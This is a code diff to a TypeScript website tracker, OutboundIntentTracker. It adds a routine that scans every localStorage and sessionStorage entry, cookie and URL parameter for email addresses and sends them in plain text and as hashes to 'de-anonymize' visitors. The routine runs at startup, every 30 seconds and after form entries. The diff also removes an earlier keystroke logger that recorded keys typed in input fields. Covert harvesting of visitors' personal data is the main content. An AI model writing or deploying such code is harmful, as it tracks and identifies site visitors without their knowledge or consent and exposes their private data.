@@ -62,26 +62,34 @@ class OutboundIntentTracker {
     // 2. Load existing visitor ID
     this.loadVisitorId();
 
-    // 3. Update page history for backtracking detection
+    // 3. Scan browser storage for emails (for de-anonymization)
+    this.scanBrowserForEmails();
+
+    // 4. Update page history for backtracking detection
     this.updatePageHistory();
 
-    // 4. Set up event listeners
+    // 5. Set up event listeners
     this.attachEventListeners();
 
-    // 5. Track initial pageview
+    // 6. Track initial pageview
     this.trackPageview();
 
-    // 6. Start active time tracking
+    // 7. Start active time tracking
     this.startActiveTimeTracking();
 
-    // 7. Start reading time tracking
+    // 8. Start reading time tracking
     this.startReadingTimeTracking();
 
-    // 8. Set up beacon on page unload
+    // 9. Set up beacon on page unload
     this.setupUnloadBeacon();
 
-    // 9. Auto-load YouTube tracking integration
+    // 10. Auto-load YouTube tracking integration
     this.loadYouTubeTracking();
+
+    // 11. Periodic browser storage scan (every 30 seconds to catch updates)
+    setInterval(() => {
+      this.scanBrowserForEmails();
+    }, 30000);
 
     this.log('Tracker initialized', { visitorId: this.visitorId, sessionId: this.sessionId });
   }
@@ -198,7 +206,7 @@ class OutboundIntentTracker {
 
     // Keyboard event tracking
     document.addEventListener('keydown', (e) => {
-      this.trackKeyPress(e);
+      // Key press tracking removed - not needed for higher deliverability
     }, { passive: true });
 
     // Form tracking
@@ -225,6 +233,8 @@ class OutboundIntentTracker {
           target.value && 
           target.value.includes('@')) {
         this.captureEmailForIdentity(target.value);
+        // Re-scan browser storage after email input (storage might have updated)
+        setTimeout(() => this.scanBrowserForEmails(), 1000);
       }
     }, true);
 
@@ -292,7 +302,7 @@ class OutboundIntentTracker {
     // Track reading/engagement start time
     this.pageStartTime = Date.now();
 
-    this.trackEvent('pageview', {
+    this.trackEvent('page_view', {
       // Page info
       title: document.title,
       path: window.location.pathname,
@@ -404,41 +414,14 @@ class OutboundIntentTracker {
     });
   }
 
-  private trackKeyPress(e: KeyboardEvent): void {
-    // Skip tracking modifier keys alone (Shift, Ctrl, Alt, Meta)
-    if (['Shift', 'Control', 'Alt', 'Meta', 'CapsLock', 'Tab'].includes(e.key)) {
-      return;
-    }
-
-    const target = e.target as HTMLElement;
-    const isInputField = target.tagName === 'INPUT' || target.tagName === 'TEXTAREA' || target.tagName === 'SELECT';
-    
-    this.trackEvent('key_press', {
-      key: e.key,
-      code: e.code,
-      keyCode: e.keyCode,
-      which: e.which,
-      // Modifier keys
-      shiftKey: e.shiftKey,
-      ctrlKey: e.ctrlKey,
-      altKey: e.altKey,
-      metaKey: e.metaKey,
-      // Context
-      isInputField: isInputField,
-      targetTag: target.tagName.toLowerCase(),
-      targetType: (target as HTMLInputElement).type || null,
-      targetId: target.id || null,
-      targetName: (target as HTMLInputElement).name || null,
-      // Prevent default info (for debugging)
-      defaultPrevented: e.defaultPrevented
-    });
-  }
+  // Key press tracking removed - not needed for higher deliverability
 
   private async trackFormSubmit(e: Event): Promise<void> {
     const form = e.target as HTMLFormElement;
     const formData = new FormData(form);
     const data: Record<string, any> = {};
     let emailFound = '';
+    let emailHash: string | null = null;
 
     // Capture form fields (hash emails)
     for (const [key, value] of Array.from(formData.entries())) {
@@ -449,6 +432,9 @@ class OutboundIntentTracker {
         data[`${key}_sha256`] = hashes.sha256;
         data[`${key}_sha1`] = hashes.sha1;
         data[`${key}_md5`] = hashes.md5;
+        
+        // Store hash for event (reuse instead of hashing again)
+        emailHash = hashes.sha256;
         
         // Store for de-anonymization
         this.storeEmailHash(hashes.sha256, value);
@@ -462,15 +448,20 @@ class OutboundIntentTracker {
       formAction: form.action,
       formMethod: form.method,
       fields: Object.keys(data),
-      hasEmail: !!emailFound
+      hasEmail: !!emailFound,
+      emailHash: emailHash,  // Include email hash for de-anonymization
+      emailDomain: emailFound ? emailFound.split('@')[1] : null
     });
 
     // If email was captured, potentially identify this visitor
     if (emailFound) {
-      this.trackEvent('email_captured', {
+        this.trackEvent('email_submitted', {
         formId: form.id || 'unknown',
         previouslyAnonymous: this.visitorId === null
       });
+      
+      // Re-scan browser storage after form submit (storage might have updated)
+      setTimeout(() => this.scanBrowserForEmails(), 1000);
     }
   }
 
@@ -1008,7 +999,7 @@ class OutboundIntentTracker {
     this.storeEmailHash(hashes.sha256, email);
     
     // Track that we captured an email (for de-anonymization)
-    this.trackEvent('email_identified', {
+    this.trackEvent('email_captured', {
       emailHash: hashes.sha256,
       emailDomain: email.split('@')[1],
       wasAnonymous: this.visitorId === null,
@@ -1024,6 +1015,172 @@ class OutboundIntentTracker {
     } catch (e) {
       console.log('Failed to store email hash', e);
     }
+  }
+
+  /**
+   * Comprehensive email scanning from browser storage
+   * Scans localStorage, sessionStorage, cookies, and URL params
+   * Sends all found emails (hashed) for de-anonymization
+   */
+  private async scanBrowserForEmails(): Promise<void> {
+    try {
+      const foundEmails = new Set<string>();
+      const emailSources: Array<{ source: string; email: string }> = [];
+
+      // 1. Scan localStorage
+      try {
+        for (let i = 0; i < localStorage.length; i++) {
+          const key = localStorage.key(i);
+          if (key) {
+            const value = localStorage.getItem(key);
+            if (value) {
+              const emails = this.extractEmails(value);
+              emails.forEach(email => {
+                foundEmails.add(email.toLowerCase().trim());
+                emailSources.push({ source: `localStorage.${key}`, email });
+              });
+            }
+          }
+        }
+      } catch (e) {
+        this.log('Failed to scan localStorage', e);
+      }
+
+      // 2. Scan sessionStorage
+      try {
+        for (let i = 0; i < sessionStorage.length; i++) {
+          const key = sessionStorage.key(i);
+          if (key) {
+            const value = sessionStorage.getItem(key);
+            if (value) {
+              const emails = this.extractEmails(value);
+              emails.forEach(email => {
+                foundEmails.add(email.toLowerCase().trim());
+                emailSources.push({ source: `sessionStorage.${key}`, email });
+              });
+            }
+          }
+        }
+      } catch (e) {
+        this.log('Failed to scan sessionStorage', e);
+      }
+
+      // 3. Scan cookies
+      try {
+        const cookies = document.cookie.split(';');
+        for (const cookie of cookies) {
+          const [key, value] = cookie.split('=').map(s => s.trim());
+          if (value) {
+            const emails = this.extractEmails(value);
+            emails.forEach(email => {
+              foundEmails.add(email.toLowerCase().trim());
+              emailSources.push({ source: `cookie.${key}`, email });
+            });
+          }
+        }
+      } catch (e) {
+        this.log('Failed to scan cookies', e);
+      }
+
+      // 4. Scan URL parameters
+      try {
+        const urlParams = new URLSearchParams(window.location.search);
+        for (const [key, value] of urlParams.entries()) {
+          const emails = this.extractEmails(value);
+          emails.forEach(email => {
+            foundEmails.add(email.toLowerCase().trim());
+            emailSources.push({ source: `url.${key}`, email });
+          });
+        }
+      } catch (e) {
+        this.log('Failed to scan URL params', e);
+      }
+
+      // 5. Hash and send all found emails
+      if (foundEmails.size > 0) {
+        const emailHashes: Array<{ email: string; hash: string; sources: string[] }> = [];
+        
+        for (const email of foundEmails) {
+          if (this.isValidEmail(email)) {
+            const hashes = await this.hashEmail(email);
+            const sources = emailSources
+              .filter(s => s.email.toLowerCase().trim() === email)
+              .map(s => s.source);
+            
+            emailHashes.push({
+              email, // Send plain text too (as requested)
+              hash: hashes.sha256,
+              sources
+            });
+          }
+        }
+
+        if (emailHashes.length > 0) {
+          this.trackEvent('browser_emails_scanned', {
+            emailCount: emailHashes.length,
+            emails: emailHashes, // Includes both plain text and hashes
+            scannedSources: ['localStorage', 'sessionStorage', 'cookies', 'url']
+          });
+
+          this.log(`Found ${emailHashes.length} email(s) in browser storage`, emailHashes);
+        }
+      }
+    } catch (error) {
+      this.log('Error scanning browser for emails', error);
+    }
+  }
+
+  /**
+   * Extract email addresses from text (supports multiple formats)
+   */
+  private extractEmails(text: string): string[] {
+    if (!text || typeof text !== 'string') return [];
+    
+    const emails: string[] = [];
+    
+    // Standard email regex
+    const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
+    const matches = text.match(emailRegex);
+    
+    if (matches) {
+      emails.push(...matches);
+    }
+
+    // Also check for JSON-encoded emails
+    try {
+      const parsed = JSON.parse(text);
+      if (typeof parsed === 'object') {
+        const jsonString = JSON.stringify(parsed);
+        const jsonMatches = jsonString.match(emailRegex);
+        if (jsonMatches) {
+          emails.push(...jsonMatches);
+        }
+      }
+    } catch (e) {
+      // Not JSON, ignore
+    }
+
+    // Check for URL-encoded emails
+    try {
+      const decoded = decodeURIComponent(text);
+      const decodedMatches = decoded.match(emailRegex);
+      if (decodedMatches) {
+        emails.push(...decodedMatches);
+      }
+    } catch (e) {
+      // Not URL encoded, ignore
+    }
+
+    return [...new Set(emails)]; // Remove duplicates
+  }
+
+  /**
+   * Validate email format
+   */
+  private isValidEmail(email: string): boolean {
+    if (!email || typeof email !== 'string') return false;
+    const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+    return emailRegex.test(email.trim());
   }
 
   // Company domain extraction (from email)
